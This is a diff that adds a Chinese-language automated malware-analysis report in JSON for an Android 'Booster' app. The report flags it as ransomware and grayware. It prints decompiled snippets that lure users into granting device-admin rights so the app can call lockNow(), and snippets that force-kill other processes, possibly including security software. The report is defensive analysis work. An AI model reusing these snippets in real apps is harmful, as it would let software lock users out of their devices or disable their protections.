@@ -1,0 +1,106 @@
+{
+  "APK信息": {
+    "文件名": "fd261e576f13a7d49094926f3331ecf53387827280bceb3b71891939193025eb.apk",
+    "sha256": "fd261e576f13a7d49094926f3331ecf53387827280bceb3b71891939193025eb",
+    "包名": "com.gigmobile.booster",
+    "应用名": "Booster",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 410.8
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\gigmobile\\booster\\activity\\LockScreenActivity;",
+          "method_signature": "if(this.b.isAdminActive(this.f311a)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.b = (DevicePolicyManager) getSystemService(\"device_policy\");\nthis.f311a = new ComponentName(this, LockScreenReceiver.class);\nif (this.b.isAdminActive(this.f311a)) {\n    this.b.lockNow();\n} else {\n    Intent intent = new Intent(\"android.app.action.ADD_DEVICE_ADMIN\");\n    intent.putExtra(\"android.app.extra.DEVICE_ADMIN\", this.f311a);\n    startActivity(intent);\n}",
+          "malicious_code_snippet_context": "      @Override // android.app.Activity\n      protected void onCreate(Bundle bundle) {\n          super.onCreate(bundle);\n>>>         this.b = (DevicePolicyManager) getSystemService(\"device_policy\");\n>>>         this.f311a = new ComponentName(this, (Class<?>) LockScreenReceiver.class);\n>>>         if (!getIntent().getBooleanExtra(\"from_receiver\", false)) {\n>>>             Log.i(\"debug\", \"active admin : \" + this.b.isAdminActive(this.f311a));\n>>>             if (this.b.isAdminActive(this.f311a)) {\n>>>                 this.b.lockNow();\n>>>             } else {\n>>>                 try {\n>>>                     Intent intent = new Intent(\"android.app.action.ADD_DEVICE_ADMIN\");\n                      intent.putExtra(\"android.app.extra.DEVICE_ADMIN\", this.f311a);\n                      startActivity(intent);\n                  } catch (Exception e) {",
+          "behavior_description": "代码获取DevicePolicyManager服务并创建指向LockScreenReceiver的ComponentName，检查设备管理员是否已激活。若已激活则直接调用lockNow()强制锁定设备屏幕；若未激活则通过ACTION_ADD_DEVICE_ADMIN意图诱导用户授予设备管理员权限，获取权限后即可随时锁屏。这是典型的勒索软件设备锁屏行为，数据流向为：获取设备管理员权限(DevicePolicyManager)→强制锁屏(lockNow)。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.KILL_BACKGROUND_PROCESSES"
+        ],
+        "字符串": [
+          "killBackgroundProcesses",
+          "forceStopPackage",
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\gigmobile\\booster\\activity\\ec;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 8)",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "com.gigmobile.booster.h.av.a(\"kill \" + bVar.c());\ncom.gigmobile.booster.h.a.c(context, bVar.i());\nActivityManager activityManager = (ActivityManager) context.getSystemService(\"activity\");\nactivityManager.restartPackage(bVar.i());\nif (Build.VERSION.SDK_INT >= 8) {\n    activityManager.killBackgroundProcesses(bVar.i());\n}\nProcess.killProcess(bVar.c());",
+          "malicious_code_snippet_context": "          context = this.f428a.g;\n          com.gigmobile.booster.e.b bVar = this.c;\n          if (com.gigmobile.booster.h.av.b(context)) {\n>>>             com.gigmobile.booster.h.av.a(\"kill \" + bVar.c());\n>>>             com.gigmobile.booster.h.a.c(context, bVar.i());\n>>>         }\n>>>         ActivityManager activityManager = (ActivityManager) context.getSystemService(\"activity\");\n>>>         activityManager.restartPackage(bVar.i());\n>>>         if (Build.VERSION.SDK_INT >= 8) {\n>>>             activityManager.killBackgroundProcesses(bVar.i());\n>>>         }\n          Process.killProcess(bVar.c());\n          context2 = this.f428a.g;\n          com.gigmobile.booster.h.n.a(context2, this.c.d());",
+          "behavior_description": "该代码通过多种方式强制杀死指定进程：首先通过shell命令执行kill（需root权限），然后调用ActivityManager.restartPackage()和killBackgroundProcesses()杀死指定包名的后台进程，最后直接调用Process.killProcess()通过PID杀死进程。数据来源为bVar对象中存储的进程PID(bVar.c())和包名(bVar.i())，危险操作为多层级进程杀死操作。这种多管齐下的进程杀死方式在伪装为'内存加速/清理'的灰色软件中常见，可能用于杀死安全软件、竞争进程或干扰系统正常运行。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
